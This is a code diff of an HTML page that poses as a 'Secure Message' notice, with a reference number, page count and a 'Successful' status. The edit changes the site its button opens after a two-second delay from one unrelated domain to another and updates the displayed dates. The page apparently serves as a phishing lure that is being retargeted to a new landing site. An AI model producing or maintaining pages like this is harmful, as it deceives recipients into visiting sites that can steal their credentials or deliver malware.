@@ -13,7 +13,7 @@
       button.disabled = true;
       loader.classList.remove('hidden');
       setTimeout(() => {
-        window.open("https://mustoinsurance.com/", "_blank", "noopener,noreferrer");
+        window.open("https://codcpaorganizer.com/", "_blank", "noopener,noreferrer");
         button.disabled = false;
         loader.classList.add('hidden');
       }, 2000);
@@ -30,7 +30,7 @@
         </svg>
         <h1 class="text-lg font-semibold">Secure Message</h1>
       </div>
-      <p class="text-sm opacity-90">12/15/2025 9:12 AM</p>
+      <p class="text-sm opacity-90">01/26/2026 9:12 AM</p>
     </div>
     <div class="bg-white px-6 py-6 space-y-6">
       <div>
@@ -38,7 +38,7 @@
         <p class="text-sm text-gray-600">The message was sent securely to protect sensitive information included in the correspondence.</p>
       </div>
       <div class="border-t border-b py-4 space-y-2 text-sm">
-        <div class="flex justify-between"><span class="font-medium">Date Received</span><span>12/14/2025</span></div>
+        <div class="flex justify-between"><span class="font-medium">Date Received</span><span>01/26/2026</span></div>
         <div class="flex justify-between"><span class="font-medium">Reference Number</span><span>SP005581456</span></div>
         <div class="flex justify-between"><span class="font-medium">Number of Pages</span><span>3</span></div>
         <div class="flex justify-between"><span class="font-medium">Status Code</span><span class="text-green-600 font-medium">Successful</span></div>
@@ -92,3 +92,4 @@
   </div>
 </body>
 </html>
+
